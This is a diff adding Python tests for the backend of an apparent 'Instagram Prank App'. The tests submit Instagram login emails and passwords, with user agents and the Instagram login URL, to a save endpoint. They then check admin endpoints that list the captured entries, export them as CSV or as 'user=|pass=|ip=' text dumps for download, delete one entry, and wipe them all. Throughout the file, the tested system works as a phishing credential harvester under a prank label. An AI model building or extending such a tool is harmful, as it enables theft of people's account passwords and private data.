@@ -658,6 +658,401 @@ def test_get_pranked_credentials_endpoint():
     print("   ✅ All GET /api/pranked-credentials endpoint tests passed!")
     return True
 
+def test_admin_export_csv_endpoint():
+    """
+    Test GET /api/pranked-credentials/export?format=csv endpoint:
+    - Returns 200 status code
+    - Content-type is text/csv
+    - Includes header with all fields
+    """
+    print("\n🧪 Testing GET /api/pranked-credentials/export?format=csv (Admin Export CSV)")
+    
+    pranked_user_file = Path("/app/backend/pranked_user.json")
+    
+    # Ensure we have some test data
+    print("   Setting up test data...")
+    if pranked_user_file.exists():
+        pranked_user_file.unlink()
+    
+    # Create test entry
+    test_entry = {
+        "email": "csv_export_test@example.com",
+        "password": "csvtest123",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        # Create test data
+        response = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=test_entry,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response.status_code != 200:
+            print(f"   ❌ Failed to create test data: {response.status_code}")
+            return False
+        
+        print("   ✅ Test data created")
+        
+        # Test CSV export
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials/export?format=csv")
+        
+        print(f"   Status Code: {response.status_code}")
+        print(f"   Content-Type: {response.headers.get('content-type')}")
+        
+        # Check status code
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        # Check content type
+        content_type = response.headers.get('content-type', '').lower()
+        if 'text/csv' not in content_type:
+            print(f"   ❌ Expected text/csv content-type, got {content_type}")
+            return False
+        
+        # Check CSV content
+        csv_content = response.text
+        print(f"   CSV Content Preview: {csv_content[:200]}...")
+        
+        # Verify CSV has header with all required fields
+        lines = csv_content.strip().split('\n')
+        if len(lines) < 1:
+            print("   ❌ CSV content is empty")
+            return False
+        
+        header = lines[0]
+        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
+        
+        for field in required_fields:
+            if field not in header:
+                print(f"   ❌ Required field '{field}' not found in CSV header")
+                return False
+        
+        print("   ✅ CSV header contains all required fields")
+        
+        # Verify we have data rows (at least 1 beyond header)
+        if len(lines) < 2:
+            print("   ❌ CSV should have at least 1 data row beyond header")
+            return False
+        
+        print(f"   ✅ CSV contains {len(lines)-1} data rows")
+        
+        # Check Content-Disposition header for download
+        content_disposition = response.headers.get('content-disposition', '')
+        if 'attachment' not in content_disposition or 'filename' not in content_disposition:
+            print(f"   ⚠️  Content-Disposition header may be missing or incomplete: {content_disposition}")
+        else:
+            print("   ✅ Content-Disposition header configured for download")
+        
+        print("   ✅ CSV export endpoint working correctly")
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Error testing CSV export: {str(e)}")
+        return False
+
+def test_admin_export_txt_endpoint():
+    """
+    Test GET /api/pranked-credentials/export?format=txt endpoint:
+    - Returns 200 status code
+    - Content-type is text/plain
+    - Returns lines per entry format
+    """
+    print("\n🧪 Testing GET /api/pranked-credentials/export?format=txt (Admin Export TXT)")
+    
+    try:
+        # Test TXT export (using existing data from previous test)
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials/export?format=txt")
+        
+        print(f"   Status Code: {response.status_code}")
+        print(f"   Content-Type: {response.headers.get('content-type')}")
+        
+        # Check status code
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        # Check content type
+        content_type = response.headers.get('content-type', '').lower()
+        if 'text/plain' not in content_type:
+            print(f"   ❌ Expected text/plain content-type, got {content_type}")
+            return False
+        
+        # Check TXT content format
+        txt_content = response.text
+        print(f"   TXT Content Preview: {txt_content[:200]}...")
+        
+        # Verify TXT has lines per entry format
+        lines = txt_content.strip().split('\n')
+        if len(lines) < 1:
+            print("   ❌ TXT content is empty")
+            return False
+        
+        # Check that each line contains expected format (key=value pairs)
+        for i, line in enumerate(lines):
+            if not line.strip():
+                continue
+            
+            # Each line should contain key=value pairs separated by |
+            if '|' not in line or '=' not in line:
+                print(f"   ❌ Line {i+1} doesn't match expected format (key=value pairs with | separator)")
+                return False
+            
+            # Check for expected keys
+            expected_keys = ['id=', 'user=', 'pass=', 'ip=', 'ua=', 'url=', 'at=', 'ts=']
+            found_keys = sum(1 for key in expected_keys if key in line)
+            
+            if found_keys < len(expected_keys):
+                print(f"   ❌ Line {i+1} missing some expected keys")
+                return False
+        
+        print(f"   ✅ TXT contains {len(lines)} properly formatted lines")
+        
+        # Check Content-Disposition header for download
+        content_disposition = response.headers.get('content-disposition', '')
+        if 'attachment' not in content_disposition or 'filename' not in content_disposition:
+            print(f"   ⚠️  Content-Disposition header may be missing or incomplete: {content_disposition}")
+        else:
+            print("   ✅ Content-Disposition header configured for download")
+        
+        print("   ✅ TXT export endpoint working correctly")
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Error testing TXT export: {str(e)}")
+        return False
+
+def test_admin_delete_credential_endpoint():
+    """
+    Test DELETE /api/pranked-credentials/{id} endpoint:
+    - Removes exactly that entry
+    - Returns appropriate response
+    - Handles non-existent IDs properly
+    """
+    print("\n🧪 Testing DELETE /api/pranked-credentials/{id} (Admin Delete Credential)")
+    
+    pranked_user_file = Path("/app/backend/pranked_user.json")
+    
+    # Setup: Create multiple test entries
+    print("   Setting up test data with multiple entries...")
+    if pranked_user_file.exists():
+        pranked_user_file.unlink()
+    
+    test_entries = [
+        {
+            "email": "delete_test_1@example.com",
+            "password": "deletetest1",
+            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "url": "https://www.instagram.com/accounts/login/",
+            "prankedAt": datetime.now().isoformat(),
+            "timestamp": int(time.time() * 1000)
+        },
+        {
+            "email": "delete_test_2@example.com", 
+            "password": "deletetest2",
+            "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "url": "https://www.instagram.com/accounts/login/",
+            "prankedAt": datetime.now().isoformat(),
+            "timestamp": int(time.time() * 1000)
+        },
+        {
+            "email": "delete_test_3@example.com",
+            "password": "deletetest3", 
+            "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+            "url": "https://www.instagram.com/accounts/login/",
+            "prankedAt": datetime.now().isoformat(),
+            "timestamp": int(time.time() * 1000)
+        }
+    ]
+    
+    created_ids = []
+    
+    try:
+        # Create test entries
+        for i, entry in enumerate(test_entries):
+            response = requests.post(
+                f"{API_BASE_URL}/save-prank-credentials",
+                json=entry,
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if response.status_code != 200:
+                print(f"   ❌ Failed to create test entry {i+1}: {response.status_code}")
+                return False
+        
+        print("   ✅ Created 3 test entries")
+        
+        # Get all entries to find their IDs
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        if response.status_code != 200:
+            print(f"   ❌ Failed to retrieve entries: {response.status_code}")
+            return False
+        
+        all_entries = response.json()
+        if len(all_entries) < 3:
+            print(f"   ❌ Expected at least 3 entries, got {len(all_entries)}")
+            return False
+        
+        # Get the ID of the second entry to delete
+        target_id = all_entries[1]['id']
+        target_email = all_entries[1]['emailOrUsername']
+        
+        print(f"   Target for deletion: ID={target_id}, Email={target_email}")
+        
+        # Test 1: Delete the specific entry
+        print("   Test 1: Delete specific entry")
+        delete_response = requests.delete(f"{API_BASE_URL}/pranked-credentials/{target_id}")
+        
+        print(f"   Delete Status Code: {delete_response.status_code}")
+        
+        if delete_response.status_code != 200:
+            print(f"   ❌ Expected 200, got {delete_response.status_code}")
+            return False
+        
+        delete_data = delete_response.json()
+        print(f"   Delete Response: {delete_data}")
+        
+        if not delete_data.get('deleted'):
+            print("   ❌ Delete response should indicate success")
+            return False
+        
+        print("   ✅ Delete request successful")
+        
+        # Test 2: Verify the entry was actually removed
+        print("   Test 2: Verify entry was removed")
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        if response.status_code != 200:
+            print(f"   ❌ Failed to retrieve entries after delete: {response.status_code}")
+            return False
+        
+        remaining_entries = response.json()
+        print(f"   Remaining entries count: {len(remaining_entries)}")
+        
+        if len(remaining_entries) != 2:
+            print(f"   ❌ Expected 2 remaining entries, got {len(remaining_entries)}")
+            return False
+        
+        # Verify the specific entry was removed
+        remaining_ids = [entry['id'] for entry in remaining_entries]
+        if target_id in remaining_ids:
+            print(f"   ❌ Target ID {target_id} still exists after deletion")
+            return False
+        
+        remaining_emails = [entry['emailOrUsername'] for entry in remaining_entries]
+        if target_email in remaining_emails:
+            print(f"   ❌ Target email {target_email} still exists after deletion")
+            return False
+        
+        print("   ✅ Target entry successfully removed, other entries preserved")
+        
+        # Test 3: Try to delete non-existent ID
+        print("   Test 3: Delete non-existent ID")
+        fake_id = "non-existent-id-12345"
+        delete_response = requests.delete(f"{API_BASE_URL}/pranked-credentials/{fake_id}")
+        
+        print(f"   Non-existent ID Status Code: {delete_response.status_code}")
+        
+        if delete_response.status_code != 404:
+            print(f"   ❌ Expected 404 for non-existent ID, got {delete_response.status_code}")
+            return False
+        
+        print("   ✅ Non-existent ID properly returns 404")
+        
+        print("   ✅ DELETE endpoint working correctly")
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Error testing DELETE endpoint: {str(e)}")
+        return False
+
+def test_admin_clear_credentials_endpoint():
+    """
+    Test POST /api/pranked-credentials/clear endpoint:
+    - Clears all entries
+    - Subsequent GET returns []
+    """
+    print("\n🧪 Testing POST /api/pranked-credentials/clear (Admin Clear All)")
+    
+    try:
+        # Ensure we have some data first (from previous tests)
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        if response.status_code != 200:
+            print(f"   ❌ Failed to check existing data: {response.status_code}")
+            return False
+        
+        existing_data = response.json()
+        print(f"   Current entries count: {len(existing_data)}")
+        
+        # Test 1: Clear all credentials
+        print("   Test 1: Clear all credentials")
+        clear_response = requests.post(f"{API_BASE_URL}/pranked-credentials/clear")
+        
+        print(f"   Clear Status Code: {clear_response.status_code}")
+        
+        if clear_response.status_code != 200:
+            print(f"   ❌ Expected 200, got {clear_response.status_code}")
+            return False
+        
+        clear_data = clear_response.json()
+        print(f"   Clear Response: {clear_data}")
+        
+        if not clear_data.get('cleared'):
+            print("   ❌ Clear response should indicate success")
+            return False
+        
+        print("   ✅ Clear request successful")
+        
+        # Test 2: Verify GET returns empty array
+        print("   Test 2: Verify subsequent GET returns []")
+        response = requests.get(f"{API_BASE_URL}/pranked-credentials")
+        
+        print(f"   GET Status Code: {response.status_code}")
+        
+        if response.status_code != 200:
+            print(f"   ❌ Expected 200, got {response.status_code}")
+            return False
+        
+        data = response.json()
+        print(f"   GET Response: {data}")
+        
+        if data != []:
+            print(f"   ❌ Expected empty array [], got {data}")
+            return False
+        
+        print("   ✅ GET returns empty array after clear")
+        
+        # Test 3: Verify file is actually empty/cleared
+        print("   Test 3: Verify file is actually cleared")
+        pranked_user_file = Path("/app/backend/pranked_user.json")
+        
+        if pranked_user_file.exists():
+            with open(pranked_user_file, 'r') as f:
+                file_content = f.read().strip()
+            
+            if file_content:
+                try:
+                    file_data = json.loads(file_content)
+                    if file_data != []:
+                        print(f"   ❌ File should contain empty array, got {file_data}")
+                        return False
+                except json.JSONDecodeError:
+                    print("   ❌ File contains invalid JSON after clear")
+                    return False
+        
+        print("   ✅ File properly cleared")
+        
+        print("   ✅ CLEAR endpoint working correctly")
+        return True
+        
+    except Exception as e:
+        print(f"   ❌ Error testing CLEAR endpoint: {str(e)}")
+        return False
+
 def main():
     """Run all backend tests"""
     print("🚀 Starting Instagram Prank App Backend API Tests")
